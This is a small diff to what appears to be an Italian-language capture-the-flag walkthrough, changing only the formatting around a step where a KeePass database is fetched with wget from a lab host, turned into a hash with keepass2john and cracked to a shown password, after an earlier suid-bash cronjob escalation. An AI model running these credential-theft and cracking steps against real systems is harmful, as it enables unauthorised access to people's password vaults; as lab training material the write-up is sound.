@@ -145,11 +145,12 @@ Aspetta che runna tramite cronjob ed esegui il bash con suid creato
 
 ### **m.hack to r.silva**
 Nella home di m.hack c'è un file keepass kdbx.
+```
 wget http://192.168.86.129:8080/mypasswords.kdbx
+```
 Usa keepass2john per craccarlo
 ```
 keepass2john mypasswords.kdbx > hash
-
 ```
 ==Password = ihatehackers==
 
